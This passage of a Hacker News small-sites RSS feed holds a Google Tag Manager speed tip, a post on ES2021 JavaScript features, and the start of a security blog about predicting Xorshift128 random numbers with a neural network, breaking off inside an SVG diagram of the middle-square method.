target="_blank">https://www.franz-enzenhofer.com/a/gtag-make-faster</a></p><figure><img loading="lazy" width="1024" height="258" src="https://www.franz-enzenhofer.com/wp-content/uploads/image-12-1024x258.png" alt="" srcset="https://www.franz-enzenhofer.com/wp-content/uploads/image-12-1024x258.png 1024w, https://www.franz-enzenhofer.com/wp-content/uploads/image-12-300x76.png 300w, https://www.franz-enzenhofer.com/wp-content/uploads/image-12-768x193.png 768w, https://www.franz-enzenhofer.com/wp-content/uploads/image-12.png 1486w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20258'%3E%3C/svg%3E" data-lazy-srcset="https://www.franz-enzenhofer.com/wp-content/uploads/image-12-1024x258.png 1024w, https://www.franz-enzenhofer.com/wp-content/uploads/image-12-300x76.png 300w, https://www.franz-enzenhofer.com/wp-content/uploads/image-12-768x193.png 768w, https://www.franz-enzenhofer.com/wp-content/uploads/image-12.png 1486w" data-lazy-src="https://www.franz-enzenhofer.com/wp-content/uploads/image-12-1024x258.png"></figure><h2>5) Deploy &amp; Done</h2><p><strong>Click on „Submit“</strong>, finish the publish process and you are done. <strong>Visit your website. Behold the faster navigation / page load whenever you visit the next page. </strong>Oh, it’s also live on the website you are currently on, <a href="https://www.franz-enzenhofer.com/" target="_blank" rel="noreferrer noopener">feel free to click around</a>.</p><h3>X) Add me on LinkedIn and/or Fb</h3><ul><li><a href="https://www.linkedin.com/in/franzenzenhofer/" target="_blank" rel="noreferrer noopener">https://www.linkedin.com/in/franzenzenhofer/</a></li><li><a href="https://www.facebook.com/MRFRANZENZENHOFER/" target="_blank" rel="noreferrer noopener">https://www.facebook.com/MRFRANZENZENHOFER/</a></li></ul><p>I will continue posting Google Tag Manager hacks there. I ❤️ Google Tag Manager by now. It’s like root access to a website, without any deployment hassle.</p></div><div><h3>Über Franz Enzenhofer</h3><div>
<p><img src="https://www.franz-enzenhofer.com/wp-content/uploads/franz-enzenhofer-blog-author.jpg" alt="Franz Enzenhofer Author" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://www.franz-enzenhofer.com/wp-content/uploads/franz-enzenhofer-blog-author.jpg"></p><p>Hi. Ich bin Franz. SEO-Urpionier aus Österreich. Seit 1998 beschäftige ich mich mit Webseiten und SEO. Man kann im deutschsprachigen Raum nur schwer online gehen, ohne – via Google – auf eine Website zu kommen, die ich nicht auf die eine oder andere Art und Weise optimiert habe.</p></div></div></article></div></div></main></div></div>]]>
            </description>
            <link>https://www.franz-enzenhofer.com/a/quicklink-tag-manager-faster</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068608</guid>
            <pubDate>Thu, 12 Nov 2020 11:04:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Top 3 New JavaScript ES 2021 (ES 12) Features I'm Excited About]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068577">thread link</a>) | @nickbull
<br/>
November 12, 2020 | https://blog.nickbulljs.com/top-3-new-javascript-es-2021-es-12-features-i-am-excited-about | <a href="https://web.archive.org/web/*/https://blog.nickbulljs.com/top-3-new-javascript-es-2021-es-12-features-i-am-excited-about">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1605178305795/PxjbQH2GL.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>I’m using the new ECMAScript 2021 features for over a year, thanks to Babel. Almost all the features are useful, but I most liked only three of them. They saved me a lot of time and made my code more readable.</p>
<p>Here they are:</p>
<h2 id="1-logical-assignment-operator">1. Logical Assignment Operator</h2>
<p>Logical assignment operator combines the logical operations (like ?? or &amp;&amp; or ||) with an assignment (=)</p>
<p>Here are the examples:</p>
<p><code>a ||= b</code> returns <code>a</code> if <code>a</code> is a truthy, or return <code>b</code> if <code>a</code> is falsy.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605177726250/cIkPMh2iG.png?auto=format&amp;q=60" alt="1.png"></p>
<p><code>a &amp;&amp;= b</code> returns <code>b</code> if <code>a</code> is truthy, or <code>a</code> if <code>a</code> is falsy.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605177734959/9REY329Uu.png?auto=format&amp;q=60" alt="2.png"></p>
<p><code>a ??= b</code> returns <code>b</code> if <code>a</code> is <code>null</code> or <code>undefined</code>, or returns <code>a</code> if <code>a</code> is truthy.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605177747602/oZBxuBvdK.png?auto=format&amp;q=60" alt="3.png"></p>
<p>At first, it was slightly tricky to instantly understand what these operators do during a code review, but after a few weeks, everyone in the team got good with it.</p>
<h2 id="2-promiseany">2. Promise.any</h2>
<p><code>Promise.any</code> accepts an array of promises and resolves as soon as any of the supplied promises become resolved.</p>
<p>Sounds difficult, so here is an example:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605177790422/-Vsq9iww6.png?auto=format&amp;q=60" alt="4.png"></p>
<p>We make three requests simultaneously. When one of the requests resolves, <code>Promise.any</code> also resolves and log the first resolved request in the console (in our example, it’s Google)</p>
<p>If all promises were rejected, Promise.any throws a new type of error – <code>AggregateError</code>.</p>
<p>What’s new about it is the <code>AggregateError</code> object represents an error where several errors are wrapped in a single error.</p>
<p>Here is how it looks:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605177798713/8d0slNOD6.png?auto=format&amp;q=60" alt="5.png"></p>
<p><code>e.errors</code> is an array of the errors object.</p>
<h2 id="3-numeric-separators">3. Numeric Separators</h2>
<p>Numeric Separators give us the ability to separate thousands with an underscore (<code>_</code>) in numeric literals.</p>
<p>How it’s useful?</p>
<p>It makes our code more informative and readable.</p>
<p>Here is an example:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605177809800/A49UDx4FH.png?auto=format&amp;q=60" alt="6.png"></p>
<hr>
<p>If you want to try these three new features of ES2021 now, you can use these Babel plugins:</p>
<ul>
<li><a target="_blank" href="https://babeljs.io/docs/en/babel-plugin-proposal-logical-assignment-operators">Logical Assignment Operator</a></li>
<li><a target="_blank" href="https://babeljs.io/docs/en/babel-plugin-proposal-numeric-separator">Numeric Separator</a></li>
</ul>
<hr>
<h2 id="in-the-end">In the end...</h2>
<p>If you like this article, share it with your colleagues or friends and <a target="_blank" href="https://twitter.com/nickbulljs">check me on Twitter</a>.</p>
<p>And also, every week I send out a "3–2–1" newsletter with 3 tech news, 2 articles, and 1 advice for you.</p>
<p>📌 <a target="_blank" href="https://nickbulljs.com/">Join my 3–2–1 newsletter here</a> 📌</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.nickbulljs.com/top-3-new-javascript-es-2021-es-12-features-i-am-excited-about</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068577</guid>
            <pubDate>Thu, 12 Nov 2020 10:58:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Everyone Talks About Insecure Randomness, but Nobody Does Anything About It]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068571">thread link</a>) | @r4um
<br/>
November 12, 2020 | https://www.airza.net/2020/11/09/everyone-talks-about-insecure-randomness-but-nobody-does-anything-about-it.html | <a href="https://web.archive.org/web/*/https://www.airza.net/2020/11/09/everyone-talks-about-insecure-randomness-but-nobody-does-anything-about-it.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	<section>
		
		<p>In which I take a crack at pointing a neural network at random noise, and achieve 95+% predictive bitwise accuracy against my hated foe in this world, Xorshift128.</p>
		<blockquote><p>"Any one who considers arithmetical methods of producing random digits is, of course, in a state of sin."</p></blockquote>
	</section>
	<section>
		<h2>What exactly are you up to here?</h2>
		<p>The motivation for this blog was a secure code review a few years ago, when looking at a client's email token generation<label for="1"></label><span>I don't actually work as an RNN jockey for work- I'm a security consultant. </span>. Frankly, I don't remember what their code looked like at <i>all</i>, but it probably looked something like this:</p>
		<figure><pre><code data-lang="python"><span>"""gotta make a token and send it to the client!"""</span>
<span>very_random_number</span> <span>=</span> <span>get_random_number</span><span>()</span>
<span>two_factor_token</span> <span>=</span> <span>convert_representation</span><span>(</span><span>very_random_number</span><span>)</span>
<span>send_email</span><span>(</span><span>"Your two factor authentication token is:"</span>
	<span>+</span><span>two_factor_token</span><span>,</span><span>user_email</span><span>)</span>
<span>save_token_to_user</span><span>(</span><span>user_id</span><span>,</span><span>two_factor_token</span><span>)</span>
		</code></pre></figure>
		<p>Code like this undergirds the security of much of the internet. A user wants to reset their password, so they enter their email. We generate a secret code and send it to their email; opening the link in the email proves that the requestor is legitimate. Sometimes we text codes like this to users when they try to login to their banks; this type of association between a random number and a user is also the backbone of a huge chunk of cookie-based authentication.</p><p>Is this code secure?  Well, it depends. Naturally, we might attack the email component (as emails are sometimes sent unencrypted, whoops) or we might attack the association between the data (maybe the token and the email are derived from attacker controlled data or whatever). The quality of the random number generation here matters as well, at least in theory: some random number generators are predictable, while others are provably difficult to attack. If we could predict this, it would be super bad- we'd just trigger the email to the victim, somehow predict the RNG, and be on our way. On the other hand, even if we are able to 'predict' this, we are still in trouble: there is no obvious way to go about it without prior knowledge of what <i>convert_representation</i> is up to.</p>
		<p>I think machine learning provides the bridge here. The thought has hung in my mind for a few years, in fact; I've picked the brains of everyone I know remotely related to the field, and I've even hired some people to take a crack at it. So far, I haven't seen any prior literature suggesting that it's been possible or done, and nobody was really sure how to approach it. Finally, thanks to a generous grant from the Phil Brass Weird Ideas Foundation<label for="2"></label><span>AKA <a href="https://www.directdefense.com/">DirectDefense</a> who was happy to sponsor this research while I was not busy bug hunting for them! </span> I was able to take a few weeks to think about it methodically.</p>
		<p>The rest of this blog is structured in a pretty straightforward way: I talk about how numbers are generated at random in a computer, then talk about how to transform that notion of randomness into a learnable problem<label for="3"></label><span>A basic knowledge of machine learning, and especially gradient descent will be helpful for understanding some of my thought process through this blog. </span>. Not surprisingly, I will then solve that problem, and propose a roadmap for how to continue chipping away at the distance between my current progress and a usable attack.</p>
	</section>
	<section>
		<h2>Our Constant State of Sin</h2>
		<p>Computers, these fucked up little rocks we have forced to think, are gambling creatures. Despite the rigid constraints that we have imposed on them, we sometimes instead demand them to be fickle beyond our own capabilities, to choose a number more wildly than any human dare dream. For example, by invoking <code>Xorshift128</code>, a rather stylishly named fellow, you can choose a number between zero and about four billion (<code>2**32</code>, to be precise), which is a number that, while you do not often have a reason to choose at random, is at least a number whose neighbors you encounter at least occasionally. More excitingly, you can invoke this function a staggering <code>2**128</code> times<label for="4"></label><span>More or less the number of atoms in every living person on earth. </span> before you encounter a repetition in its pattern of randomness.</p>
		<p><i>But how?</i> I hear you cry. That is to say, A particular problem arises here, the one I think Von Neumann was referring to above: programming a computer is the art of telling it exactly what you want it to do, more or less in advance, and telling it exactly what random stuff to come up with, <i>in advance</i>, both defeats the purpose of the program in the first place and also poses fascinating logical challenges at the programming level. Certainly you do not have time to roll four billion of <i>anything</i>, and even if you did, writing each of those numbers down in some way would be a miserable use of time and hard disk space. On the other hand, cycling through just a few of the available numbers also sounds wrong; if you cycle through just a few hundred of the integers between 0 and 2**32, you're not really providing a lot of randomness.</p>
		<p>We will set aside the question of what randomness really <i>is</i> and think about it from a programming perspective. We can define a Random Number Generator (RNG) as something that outputs a sequence of numbers. In order to make sure that they are as random as possible, we're also going to introduce something new: <i>state</i>. The state gets passed into this RNG function, and in addition to outputting a random-ish number, it is going to output <i>new</i> state- this state will be as big or bigger (usually much bigger) than the output. Then we're just going to feed this output state <i>back</i> into the RNG to generate the next number in the sequence- and that's going to give us new state, which will let us continue this for quite a while. One point of confusion is that sometimes the output is <i>also</i> used as the state<label for="5"></label><span>Astute readers will wonder: where does the original state come from? Fascinatingly, movement of the mouse, entries into the keyboard, and other minutiae of computer operation are used to generate a very small amount of randomness- that is, at some level the start comes from the simple uncertainty of everyday computer use. There isn't a lot of randomness available here, so the RNG serves to <i>stretch</i> it out over a longer period of time. </span>.</p>
		<p>To take this into the concrete, we will consider an RNG, the <b>Middle-square method</b>. Relatively ancient by RNG standards, it was invented by Von Neumann sometime in the 1940s, when he was busy inventing almost everything else. A number of <code>N</code> digits is squared, and the <code>N/2</code> middle digits of the result are taken both as the <i>output</i> as well as the <i>state</i> to square for the next iteration. The simplest case, n=2, works as follows: we start with 43, square it to produce 1849, and then take the middle two digits to get our result, 84. This 84 is also our new state, so next time we're fiending for the results of a d100, we square it again, 7056, taking the middle to get 5, our output and our new state. Okay, so next is 25, which we'll call 0025, which gives us 2, which gives us 0004, translated as 0...</p>
		<p>Uh oh. We seem to have run into a dead end here. 0 squared is of course 0. These numbers are not looking so random anymore. In fact, the behavior is pretty bad no matter what number you begin with. The figure below lists all the states/outputs showing that the tendency to degrade towards cycles is pretty unavoidable.</p>
		<figure>
			<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" viewBox="-307 -5 300 450">
 <title>Middle square method 2 digits</title>
 <desc></desc>
 
 <defs>
  <path id="arrow" d="M 9.5,0 H 14 m -2,-2 l 2,2 l -2,2"></path>
  <g id="loop1">
   <path d="M 9,0 V 10 H 0"></path>
   <use xlink:href="#arrow" transform="translate(0,19) rotate(-90)"></use>
  </g>
  <g id="loop2">
   <path d="M 9,0 V -10 H -20"></path>
   <use xlink:href="#arrow" transform="translate(-20,-19) rotate(90)"></use>
  </g>
 </defs>
 <g font-family="sans-serif" font-size="10" font-weight="bold" text-anchor="middle" stroke-linejoin="round" stroke-linecap="round" stroke="none" fill="none">
  <rect x="-4999" y="-4999" width="9999" height="9999"></rect>
  <g>
   <g transform="translate(-20 ,0)"><text x="0" y="0" dy="0.7ex" transform="scale(0.75,1)">00</text><path d="M 5,  0 H 9 V   0"></path><use xlink:href="#loop1" transform="translate(0,  0)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="0" dy="0.7ex" transform="scale(0.75,1)">01</text><path d="M 5,  0 H 9 V   0"></path><use xlink:href="#arrow" transform="translate(0,  0)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="0" dy="0.7ex" transform="scale(0.75,1)">04</text><path d="M 5,  0 H 9 V   0"></path><use xlink:href="#arrow" transform="translate(0,  0)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="0" dy="0.7ex" transform="scale(0.75,1)">07</text><path d="M 5,  0 H 9 V   0"></path><use xlink:href="#arrow" transform="translate(0,  0)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="10" dy="0.7ex" transform="scale(0.75,1)">71</text><path d="M 5, 10 H 9 V   0"></path><use xlink:href="#arrow" transform="translate(0,  0)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">02</text><path d="M 5, 20 H 9 V   0"></path><use xlink:href="#arrow" transform="translate(0,  0)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">05</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">84</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">29</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">36</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">19</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-160,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">14</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-180,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">12</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-200,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">11</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-220,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">46</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-240,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">92</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-260,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">77</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-280,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">76</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-300,0)"><text x="0" y="20" dy="0.7ex" transform="scale(0.75,1)">42</text><path d="M 5, 20 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-300,0)"><text x="0" y="30" dy="0.7ex" transform="scale(0.75,1)">69</text><path d="M 5, 30 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-260,0)"><text x="0" y="40" dy="0.7ex" transform="scale(0.75,1)">89</text><path d="M 5, 40 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="50" dy="0.7ex" transform="scale(0.75,1)">37</text><path d="M 5, 50 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="60" dy="0.7ex" transform="scale(0.75,1)">58</text><path d="M 5, 60 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="70" dy="0.7ex" transform="scale(0.75,1)">43</text><path d="M 5, 70 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="80" dy="0.7ex" transform="scale(0.75,1)">62</text><path d="M 5, 80 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="80" dy="0.7ex" transform="scale(0.75,1)">25</text><path d="M 5, 80 H 9 V  80"></path><use xlink:href="#arrow" transform="translate(0, 80)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="80" dy="0.7ex" transform="scale(0.75,1)">16</text><path d="M 5, 80 H 9 V  80"></path><use xlink:href="#arrow" transform="translate(0, 80)"></use></g>
   <g transform="translate(-160,0)"><text x="0" y="80" dy="0.7ex" transform="scale(0.75,1)">13</text><path d="M 5, 80 H 9 V  80"></path><use xlink:href="#arrow" transform="translate(0, 80)"></use></g>
   <g transform="translate(-180,0)"><text x="0" y="80" dy="0.7ex" transform="scale(0.75,1)">56</text><path d="M 5, 80 H 9 V  80"></path><use xlink:href="#arrow" transform="translate(0, 80)"></use></g>
   <g transform="translate(-200,0)"><text x="0" y="80" dy="0.7ex" transform="scale(0.75,1)">81</text><path d="M 5, 80 H 9 V  80"></path><use xlink:href="#arrow" transform="translate(0, 80)"></use></g>
   <g transform="translate(-200,0)"><text x="0" y="90" dy="0.7ex" transform="scale(0.75,1)">87</text><path d="M 5, 90 H 9 V  80"></path><use xlink:href="#arrow" transform="translate(0, 80)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="100" dy="0.7ex" transform="scale(0.75,1)">68</text><path d="M 5,100 H 9 V  80"></path><use xlink:href="#arrow" transform="translate(0, 80)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="100" dy="0.7ex" transform="scale(0.75,1)">41</text><path d="M 5,100 H 9 V 100"></path><use xlink:href="#arrow" transform="translate(0,100)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="110" dy="0.7ex" transform="scale(0.75,1)">75</text><path d="M 5,110 H 9 V  80"></path><use xlink:href="#arrow" transform="translate(0, 80)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="120" dy="0.7ex" transform="scale(0.75,1)">32</text><path d="M 5,120 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="120" dy="0.7ex" transform="scale(0.75,1)">18</text><path d="M 5,120 H 9 V 120"></path><use xlink:href="#arrow" transform="translate(0,120)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="120" dy="0.7ex" transform="scale(0.75,1)">72</text><path d="M 5,120 H 9 V 120"></path><use xlink:href="#arrow" transform="translate(0,120)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="120" dy="0.7ex" transform="scale(0.75,1)">27</text><path d="M 5,120 H 9 V 120"></path><use xlink:href="#arrow" transform="translate(0,120)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="130" dy="0.7ex" transform="scale(0.75,1)">61</text><path d="M 5,130 H 9 V 120"></path><use xlink:href="#arrow" transform="translate(0,120)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="140" dy="0.7ex" transform="scale(0.75,1)">82</text><path d="M 5,140 H 9 V 120"></path><use xlink:href="#arrow" transform="translate(0,120)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="150" dy="0.7ex" transform="scale(0.75,1)">73</text><path d="M 5,150 H 9 V 120"></path><use xlink:href="#arrow" transform="translate(0,120)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="160" dy="0.7ex" transform="scale(0.75,1)">45</text><path d="M 5,160 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="170" dy="0.7ex" transform="scale(0.75,1)">55</text><path d="M 5,170 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="180" dy="0.7ex" transform="scale(0.75,1)">95</text><path d="M 5,180 H 9 V  20"></path><use xlink:href="#arrow" transform="translate(0, 20)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">03</text><path d="M 5,190 H 9 V   0"></path><use xlink:href="#arrow" transform="translate(0,  0)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">06</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">08</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">09</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">64</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">93</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-160,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">44</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-180,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">21</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-200,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">96</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-220,0)"><text x="0" y="190" dy="0.7ex" transform="scale(0.75,1)">31</text><path d="M 5,190 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-220,0)"><text x="0" y="200" dy="0.7ex" transform="scale(0.75,1)">63</text><path d="M 5,200 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-180,0)"><text x="0" y="210" dy="0.7ex" transform="scale(0.75,1)">38</text><path d="M 5,210 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="220" dy="0.7ex" transform="scale(0.75,1)">33</text><path d="M 5,220 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="230" dy="0.7ex" transform="scale(0.75,1)">78</text><path d="M 5,230 H 9 V 190"></path><use xlink:href="#arrow" transform="translate(0,190)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="230" dy="0.7ex" transform="scale(0.75,1)">28</text><path d="M 5,230 H 9 V 230"></path><use xlink:href="#arrow" transform="translate(0,230)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="230" dy="0.7ex" transform="scale(0.75,1)">17</text><path d="M 5,230 H 9 V 230"></path><use xlink:href="#arrow" transform="translate(0,230)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="240" dy="0.7ex" transform="scale(0.75,1)">91</text><path d="M 5,240 H 9 V 230"></path><use xlink:href="#arrow" transform="translate(0,230)"></use></g>
   <g transform="translate(-160,0)"><text x="0" y="240" dy="0.7ex" transform="scale(0.75,1)">54</text><path d="M 5,240 H 9 V 240"></path><use xlink:href="#arrow" transform="translate(0,240)"></use></g>
  </g>
  <g transform="translate(0,10)">
   <g transform="translate(-20 ,0)"><text x="0" y="250" dy="0.7ex" transform="scale(0.75,1)">10</text><path d="M 5,250 H 9 V 250"></path><use xlink:href="#loop1" transform="translate(0,250)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="250" dy="0.7ex" transform="scale(0.75,1)">90</text><path d="M 5,250 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="250" dy="0.7ex" transform="scale(0.75,1)">30</text><path d="M 5,250 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="250" dy="0.7ex" transform="scale(0.75,1)">48</text><path d="M 5,250 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="250" dy="0.7ex" transform="scale(0.75,1)">22</text><path d="M 5,250 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="250" dy="0.7ex" transform="scale(0.75,1)">15</text><path d="M 5,250 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="250" dy="0.7ex" transform="scale(0.75,1)">34</text><path d="M 5,250 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="260" dy="0.7ex" transform="scale(0.75,1)">35</text><path d="M 5,260 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="260" dy="0.7ex" transform="scale(0.75,1)">66</text><path d="M 5,260 H 9 V 260"></path><use xlink:href="#arrow" transform="translate(0,260)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="270" dy="0.7ex" transform="scale(0.75,1)">65</text><path d="M 5,270 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="280" dy="0.7ex" transform="scale(0.75,1)">85</text><path d="M 5,280 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="290" dy="0.7ex" transform="scale(0.75,1)">59</text><path d="M 5,290 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="300" dy="0.7ex" transform="scale(0.75,1)">67</text><path d="M 5,300 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="300" dy="0.7ex" transform="scale(0.75,1)">26</text><path d="M 5,300 H 9 V 300"></path><use xlink:href="#arrow" transform="translate(0,300)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="310" dy="0.7ex" transform="scale(0.75,1)">70</text><path d="M 5,310 H 9 V 250"></path><use xlink:href="#arrow" transform="translate(0,250)"></use></g>
